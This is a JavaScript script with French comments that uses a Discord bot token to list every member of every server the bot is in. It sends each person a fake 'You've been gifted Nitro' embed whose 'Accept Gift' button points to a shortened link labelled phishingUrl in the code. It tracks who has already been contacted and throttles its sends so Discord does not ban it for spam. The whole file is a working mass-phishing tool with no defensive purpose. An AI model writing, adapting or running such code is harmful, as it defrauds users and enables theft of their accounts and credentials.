const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./config.json'));
const token = config.token;

const phishingUrl = "https://tinyurl.com/6c6b86en";
const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";

async function dmAll() {
  console.log("Démarrage de l'envoi global...");
  
  let guildsRes = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
    headers: { "Authorization": `Bot ${token}` }
  });
  let guilds = await guildsRes.json();
  
  if (!Array.isArray(guilds)) {
    console.log("Erreur serveurs :", guilds.message);
    return;
  }

  // C'est ici qu'on stocke les ID des gens déjà contactés
  let contacted = new Set();
  let totalSent = 0;

  for (let g of guilds) {
    console.log(`\n--- Scan du serveur : ${g.name} ---`);
    let after = "0";

    while (true) {
      let res = await fetch(`https://discord.com/api/v9/guilds/${g.id}/members?limit=1000&after=${after}`, {
        headers: { "Authorization": `Bot ${token}` }
      });
      let batch = await res.json();
      
      if (batch.message) { 
        console.log("Erreur membres :", batch.message); 
        break; 
      }
      if (!batch.length) { 
        break; 
      }
      
      for (let m of batch) {
        // On ignore les bots
        if (m.user.bot) continue; 

        // Si la personne a déjà été contactée sur un autre serveur, on skip
        if (contacted.has(m.user.id)) {
          continue;
        }
        
        // Création du salon DM
        let dm = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, {
          method: "POST", 
          headers: { "Authorization": `Bot ${token}`, "Content-Type": "application/json" }, 
          body: JSON.stringify({ recipient_id: m.user.id })
        })).json();
        
        if (dm.id) {
          // Envoi du faux nitro
          await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
            method: "POST",
            headers: { "Authorization": `Bot ${token}`, "Content-Type": "application/json" },
            body: JSON.stringify({
              content: "",
              embeds: [{
                title: "You've been gifted a subscription!",
                description: `**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
                color: 0x5865f2,
                image: { url: imageUrl }
              }],
              components: [{
                type: 1,
                components: [
                  { type: 2, style: 5, label: "Accept Gift", url: phishingUrl },
                  { type: 2, style: 5, label: "Learn More", url: "https://discord.com/nitro" }
                ]
              }]
            })
          }).catch(() => {});
          
          contacted.add(m.user.id); // On l'ajoute à la liste des gens contactés
          totalSent++;
          console.log(`[${totalSent}] Envoyé à ${m.user.username}`);
        }
        
        // Pause de 1.5 seconde pour éviter que discord ne te ban pour spam
        await new Promise(r => setTimeout(r, 1500));
      }
      
      after = batch[batch.length - 1].user.id;
    }
  }
  
  console.log(`\n--- FINI. Total de personnes uniques contactées : ${totalSent} ---`);
}

dmAll();